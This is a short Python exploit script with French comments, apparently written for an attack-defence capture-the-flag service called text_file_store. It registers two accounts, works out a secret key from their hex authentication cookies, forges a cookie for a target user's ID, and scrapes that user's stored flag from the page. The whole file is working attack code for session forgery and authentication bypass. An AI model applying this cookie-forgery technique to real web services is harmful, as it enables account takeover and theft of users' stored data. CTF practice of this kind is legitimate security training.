#!/usr/bin/python
# -*- coding: utf-8 -*-

# Exploit du service text_file_store
import sys
from lxml import html
import requests

if len(sys.argv) != 3 :
    print("Exploit du service jokes\n\nUsage : " +  __file__ + " [hostname] [target]\n[target] est l'ID du flag de la team participant au CTF");
    exit();

host = sys.argv[1]
target = sys.argv[2]
port = 20136

infos_a = {"username" : "A", "password" : "A"}
infos_b = {"username" : "B", "password" : "B"}

register_a = requests.post('http://'+host+':20136/fuckapache.cgi/register', data = infos_a)
register_b = requests.post('http://'+host+':20136/fuckapache.cgi/register', data = infos_b)

session = requests.Session()

login_a = session.post('http://'+host+':20136/fuckapache.cgi/login', data = infos_a)
cookie_a = session.cookies['AUTH_COOKIE']
#print(cookie_a)

session_b = requests.Session()
login_b = session.post('http://'+host+':20136/fuckapache.cgi/login', data = infos_b)
cookie_b = session.cookies['AUTH_COOKIE']
#print(cookie_b)

cookie_a_int = int(cookie_a,16)
cookie_b_int = int(cookie_b,16)
secret_key = cookie_b_int - cookie_a_int

target_encoded = int(target.encode('hex'), 16)

cookie_target = {'AUTH_COOKIE' : '%x' % (target_encoded*secret_key)}
#print(cookie_target)

session_target = requests.Session()
requests.utils.add_dict_to_cookiejar(session_target.cookies, cookie_target)

login_target = session_target.get('http://'+host+':20136/fuckapache.cgi/?login=OK')
target_tree = html.fromstring(login_target.content)
flag = (target_tree.xpath('//*[@class="draft top"]/textarea'))[0]
print(flag.text)
